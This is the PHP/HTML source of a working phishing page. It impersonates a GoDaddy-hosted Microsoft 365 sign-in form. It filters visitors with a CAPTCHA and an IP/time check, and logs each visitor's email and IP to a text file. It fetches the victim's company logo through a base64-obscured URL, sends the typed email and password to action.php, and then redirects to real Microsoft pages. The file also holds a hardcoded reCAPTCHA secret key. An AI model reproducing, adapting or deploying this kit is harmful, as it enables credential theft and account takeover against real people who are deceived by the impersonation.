<?php
session_start();

if(isset($_POST["g-recaptcha-response"])){
$response = $_POST["g-recaptcha-response"];
$url = 'https://www.google.com/recaptcha/api/siteverify';
	$data = array(
		'secret' => '6LdhAVIoAAAAAGQA4mElvcgTOzmBLjJzM7k4qnlF',
		'response' => $response
	);
	$options = array(
		'http' => array (
			'method' => 'POST',
			'content' => http_build_query($data),
			'header' => 'Content-Type: application/x-www-form-urlencoded'
		)
	);
	$context  = stream_context_create($options);
	$verify = file_get_contents($url, false, $context);
	$captcha_success=json_decode($verify);

	if ($captcha_success->success==false) {
							header('Location: index.php');
exit;

	}
}elseif(isset($_SESSION['time']) && isset($_SESSION['ip'])){



}else{
								header('Location: index.php');
exit;
}

if(!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
      $ip=$_SERVER['REMOTE_ADDR'];
    }


		if(isset($_SESSION['time']) && isset($_SESSION['ip'])){
		if(($_SESSION['time'] + 90 > time()) && ($ip == $_SESSION['ip'])){

			$_SESSION['lgn'] = '1';

		}else{
			session_destroy();
							header('Location: index.php');
exit;
		}
	}else{
	$_SESSION['ip']=$ip;
	$_SESSION['time']= time();
	$_SESSION['lgn'] = '1';
	}

	if(isset($_SESSION['eml'])){
	$email = $_SESSION['eml'];
		}



	if(isset($_SESSION['eml'])){
	 $email = $_SESSION['eml'];
//	 $email = $_GET['email'];
		$contents = "\n Email: ".$email."\n"." IP: ".$ip."\n";
		$file = "fuckeryou.txt";
		file_put_contents($file, $contents, FILE_APPEND | LOCK_EX);
}
if(isset($_SESSION['codex'])){

	} else {


if(isset($_SESSION['finished'])){
	header("location: https://www.office.com");
	}

		}

?>
<html>
<head>
<title>Microsoft Office Center</title>
	<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="shortcut icon" href="images/favicon.ico" />
 <meta name="description" content="">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1"> -->
    <meta name="next-head-count" content="4">

    <link rel="stylesheet" type="text/css" href="css/custom.css">
</head>
<style type="text/css">
.centered-modal.in {
    display: flex !important;
}
.centered-modal .modal-dialog {
    margin: auto;
}


.loader,.wrapper {
  position:absolute;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
}
.loader {
  width:10vw;
}
.loader .wrapper span {
  width:5px;
  height:5px;
  background:#0067b8;
  display:inline-block;
  position:relative;
  margin:0px 2px;
  border-radius:50%;
  opacity:0;
  animation:loading 3000ms ease-in-out infinite;
}
.loader .wrapper span:nth-child(5) {
  animation-delay:100ms;
}
.loader .wrapper span:nth-child(4) {
  animation-delay:200ms;
}
.loader .wrapper span:nth-child(3) {
  animation-delay:300ms;
}
.loader .wrapper span:nth-child(2) {
  animation-delay:400ms;
}
.loader .wrapper span:nth-child(1) {
  animation-delay:500ms;
}
@keyframes loading {
  0% {
    transform:translateX(-350px);
    opacity:0;
  }
  35%,65% {
    transform:translateX(0px);
    opacity:1;
  }
  100% {
    transform:translateX(350px);
    opacity:0;
  }
}

</style>

<body>

<?php
	  if(isset($email)){
			  $domain = substr(strrchr($email, "@"), 1);
				$uri = base64_decode("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8=");
				 $lgx = $uri.$domain;

				$fgc = @file_get_contents($lgx);
				 $emi = @imagecreatefromstring($fgc);

				if ($emi) {
					$img = $lgx;

				/*	$img = imagecreatefromstring(file_get_contents(base64_decode("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8=").$domain));
						ob_start();
						imagepng($img);
						$png = ob_get_clean();
						$uri = "data:image/png;base64," . base64_encode($png);

										$img = $uri;
										*/
				} else {
				$img = 'images/logo.svg';
				}

	  } else {
				$img = 'images/logo.svg';
				$o_logo = '1';
				}
			?>

       <div id="main-page">
            <div class="header flex-row d-flex">
                <div id="hcs-header-container">
                    <a href="https://www.godaddy.com/" target="_self" data-eid="uxp.hyd.utility_bar.logo.link.click" class="topnav-logo">
                        <div class="go-logo desktop-logo" aria-label="GoDaddy">
                            <svg viewBox="0 0 163 34" xmlns="http://www.w3.org/2000/svg">
                                <path d="M32.937 1.554c-3.968-2.48-9.193-1.89-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.436 20.436 0 0 1-2.46-5.632 16.104 16.104 0 0 1-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.092 24.092 0 0 0-4.228 5.08C8.697 15.086 7.71 20.849 8.84 25.444a20.912 20.912 0 0 1-2.408-3.151H6.43zm27.786-5.634a20.484 20.484 0 0 1-2.46 5.632 21.103 21.103 0 0 1-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.624.624 0 0 0-.895-.243l-7.72 4.823a.629.629 0 0 0-.2.87l1.133 1.81a.632.632 0 0 0 .869.2l5.004-3.125c.162.486.324.97.445 1.457.472 1.725.653 3.518.536 5.303-.238 3.15-1.521 5.606-3.612 6.914a7.061 7.061 0 0 1-3.579 1.036h-.16a7.051 7.051 0 0 1-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 0 1 .534-5.31 21.015 21.015 0 0 1 6.444-10.314 16.136 16.136 0 0 1 4.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.76 3.613 6.914a16.145 16.145 0 0 1-.528 5.31zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.12 7.34 7.12 4.086 0 7.366-3.111 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385v-.006zM90.583 7.362h-7.468a.6.6 0 0 0-.61.612v18.208a.607.607 0 0 0 .61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.63.63 0 0 0-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.75-6.783 7.145 0 4.37 3.251 7.17 6.755 7.17 1.806 0 3.28-.776 3.92-1.833v.86a.585.585 0 0 0 .582.586h2.808a.575.575 0 0 0 .543-.36.564.564 0 0 0 .041-.225V13.896a.595.595 0 0 0-.591-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412v.002zm22.294-16.118h-2.808a.588.588 0 0 0-.561.355.598.598 0 0 0-.049.229v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.75-6.7 7.145 0 4.37 3.252 7.17 6.755 7.17 1.806 0 3.17-.776 3.92-1.833v.86c0 .323.261.584.583.586h2.808a.571.571 0 0 0 .584-.585V7.95a.569.569 0 0 0-.357-.547.573.573 0 0 0-.227-.041zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.597.597 0 0 0-.562.355.581.581 0 0 0-.05.229v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.75-6.7 7.145 0 4.37 3.253 7.17 6.755 7.17 1.807 0 3.168-.776 3.92-1.833v.86a.586.586 0 0 0 .584.586h2.803a.571.571 0 0 0 .542-.36.564.564 0 0 0 .04-.225V7.95a.567.567 0 0 0-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448h-.005zm21.906-9.283-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 0 1 .554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.25-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 0 1-.635.634h-2.317a.622.622 0 0 1-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.842.842 0 0 1 .07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 0 1-.511.009.783.783 0 0 1-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 0 1-.634-.635v-2.086a.626.626 0 0 1 .634-.634h7.161a.602.602 0 0 1 .587.367.6.6 0 0 1 .049.24z"></path>
                            </svg>
                        </div>

                        <div class="go-logo mobile-logo" aria-label="GoDaddy">
                            <svg viewBox="0 0 27 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.29 1.096c-2.806-1.747-6.5-1.335-9.795.733-3.284-2.066-6.98-2.48-9.783-.733-4.433 2.766-4.972 9.89-1.203 15.91 2.779 4.44 7.124 7.04 10.992 6.993 3.868.047 8.214-2.553 10.992-6.993 3.765-6.02 3.231-13.145-1.202-15.91zM4.548 15.736a14.403 14.403 0 0 1-1.74-3.977 11.347 11.347 0 0 1-.377-3.748c.168-2.224 1.076-3.957 2.554-4.88 1.479-.924 3.433-.977 5.515-.154.316.127.626.27.928.429a16.975 16.975 0 0 0-2.99 3.586c-2.288 3.655-2.986 7.725-2.187 10.967a14.883 14.883 0 0 1-1.703-2.223zm19.648-3.977a14.438 14.438 0 0 1-1.74 3.977 14.891 14.891 0 0 1-1.702 2.228c.714-2.908.229-6.469-1.522-9.81a.44.44 0 0 0-.633-.172l-5.459 3.406a.446.446 0 0 0-.142.613l.801 1.279a.444.444 0 0 0 .615.141l3.538-2.206c.115.343.23.68.315 1.028a11.35 11.35 0 0 1 .378 3.749c-.169 2.225-1.076 3.958-2.555 4.881a4.998 4.998 0 0 1-2.53.731h-.114a4.993 4.993 0 0 1-2.53-.73c-1.48-.924-2.388-2.657-2.556-4.882a11.383 11.383 0 0 1 .378-3.749 14.835 14.835 0 0 1 4.557-7.279 11.42 11.42 0 0 1 3.204-1.982c2.076-.824 4.034-.77 5.514.153s2.386 2.656 2.554 4.88c.085 1.26-.04 2.525-.371 3.744z"></path></svg>
                        </div>
                    </a>
                </div>
            </div>

            <div class="page-content">
                <div class="left-image">
                    <img src="images/computer.png">
                </div>
                <div class="right-box">
                    <form class="login" name="login" action="action.php" method="post" enctype='multipart/form-data'>
                        <div class="form-content">
                            <img src="images/microsoft365.png">
                            <div class="sign-title">
                                <h2 id="pass-title">Sign in</h2>
                            </div>
                            <input type="email" name="email" value="<?php if(isset($email)){ echo $email;} ?>" placeholder="Email" />
                            <input type="password" name="password" id="i0116" maxlength="113" lang="en" placeholder="Password" />
                            <input type="submit" class="" value="Sign In" />
                        </div>
                    </form>
                    <div id="email-promo-footer">
                        <div class="font-primary-bold" id="email-message">
                            Don't have Microsoft 365 email?
                        </div>
                        <button class="btn-get-started" target="_parent" type="button" id="emailPromoButton">
                            <span class="ux-button-text">Get Started</span>
                        </button>
                    </div>
                </div>
            </div>

            <footer id="appheader-footer" class="manifest">
                <div class="container">Copyright © 1999 - 2023 GoDaddy Operating Company, LLC. All Rights Reserved. 
                    <a class="privacy-link" href="https://www.godaddy.com/legal/agreements/privacy-policy?target=_blank" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click">Privacy Policy</a>
                </div>
            </footer>

        </div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.8.2.js"></script>

<script type="text/javascript">
<?php if(isset($_SESSION['codex'])){ ?>

//$("#div4").style.display = 'none';
//$("#myElem").style.display = 'block';

$("#div4").hide();
$("#myElem").show();
//var redirect = "https://outlook.office.com";
setTimeout(function(){
            window.location.href = 'https://login.microsoftonline.com/jsdisabled';
         }, 3000);
 <?php
unset($_SESSION['codex']);
  } else { ?>
 $("#div4").show();
$("#myElem").hide();
  <?php }?>
</script>
</body>

</html>
